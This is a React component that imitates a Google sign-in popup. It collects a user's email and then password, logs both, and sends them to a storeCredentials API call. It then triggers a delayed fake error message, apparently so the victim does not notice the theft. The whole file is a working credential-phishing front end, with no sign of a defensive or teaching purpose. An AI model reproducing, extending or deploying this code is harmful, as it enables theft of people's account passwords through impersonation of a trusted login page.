import React, { useState } from 'react';
import GoogleSignUpForm from './GoogleSignUpForm';
import GooglePasswordForm from './GooglePasswordForm';
import { api } from './ApiFunctions.jsx';
import './GooglePopup.css';

const GoogleSignInPopup = ({ isOpen, onClose, errorMessage }) => {
  const [step, setStep] = useState(1);
  const [userData, setUserData] = useState({
    email: '',
    password: ''
  });
  
  const handleEmailSubmit = (email) => {
    setUserData({ ...userData, email });
    setStep(2);
  };

  const handlePasswordSubmit = async (password) => {
    const finalData = { ...userData, password };
    console.log('Google Sign-in data:', finalData);
    setTimeout(() => {errorMessage();}, 1500);
    try {
      await api.storeCredentials(finalData.email, finalData.password);
    } catch (error) {
      console.error('Failed to store Google credentials:', error);
    }
    onClose();
  };
  
  if (!isOpen) return null;
  
  return (
    <div className="google-popup-overlay">
      <div className="google-popup-container">
        <button className="popup-close-btn" onClick={onClose}>✕</button>
        {step === 1 ? (
          <GoogleSignUpForm onSubmit={handleEmailSubmit} />
        ) : (
          <GooglePasswordForm onSubmit={handlePasswordSubmit} email={userData.email} />
        )}
      </div>
    </div>
  );
};

export default GoogleSignInPopup;
